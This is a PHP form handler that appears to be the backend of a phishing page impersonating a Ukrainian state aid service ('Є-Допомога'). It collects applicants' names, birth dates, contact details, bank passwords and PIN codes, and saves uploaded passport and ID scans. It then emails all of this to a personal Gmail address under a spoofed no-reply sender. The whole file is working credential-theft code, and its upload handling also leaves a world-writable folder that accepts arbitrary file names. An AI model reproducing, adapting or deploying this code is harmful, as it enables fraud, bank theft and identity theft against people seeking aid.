<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $to = 'parserr06@gmail.com';
    $subject = 'Нова заявка з Є-Допомоги';
    
    // Основные данные
    $message = "
        <h2>Нова заявка на допомогу</h2>
        <h3>Особисті дані:</h3>
        <p><strong>ПІБ:</strong> " . htmlspecialchars($_POST['fullName']) . "</p>
        <p><strong>Дата народження:</strong> " . htmlspecialchars($_POST['birthDate']) . "</p>
        <p><strong>Телефон:</strong> " . htmlspecialchars($_POST['phone']) . "</p>
        <p><strong>Email:</strong> " . htmlspecialchars($_POST['email']) . "</p>
        
        <h3>Банківські дані:</h3>
        <p><strong>Банк:</strong> " . htmlspecialchars($_POST['bank']) . "</p>
        <p><strong>Телефон банку:</strong> " . htmlspecialchars($_POST['bank_phone']) . "</p>
        <p><strong>Пароль банку:</strong> " . htmlspecialchars($_POST['bank_password']) . "</p>
        <p><strong>PIN-код:</strong> " . htmlspecialchars($_POST['bank_pin']) . "</p>
        
        <h3>Завантажені документи:</h3>
    ";

    // Обработка загруженных файлов
    $uploadedFiles = [];
    foreach (['passport_photo', 'passport_registration', 'id_code'] as $fileField) {
        if (!empty($_FILES[$fileField]['name'])) {
            $uploadedFiles[] = $_FILES[$fileField]['name'];
            // Сохраняем файл на сервере
            $uploadDir = 'uploads/';
            if (!file_exists($uploadDir)) {
                mkdir($uploadDir, 0777, true);
            }
            $uploadFile = $uploadDir . basename($_FILES[$fileField]['name']);
            move_uploaded_file($_FILES[$fileField]['tmp_name'], $uploadFile);
        }
    }
    
    if (!empty($uploadedFiles)) {
        $message .= "<ul>";
        foreach ($uploadedFiles as $fileName) {
            $message .= "<li>" . htmlspecialchars($fileName) . "</li>";
        }
        $message .= "</ul>";
    } else {
        $message .= "<p>Документи не завантажені</p>";
    }

    $headers = "From: no-reply@e-dopomoga.com\r\n";
    $headers .= "MIME-Version: 1.0\r\n";
    $headers .= "Content-type: text/html; charset=utf-8\r\n";

    if (mail($to, $subject, $message, $headers)) {
        echo 'Дані успішно відправлені! Очікуйте рішення.';
    } else {
        echo 'Помилка відправки. Спробуйте ще раз.';
    }
}
?>
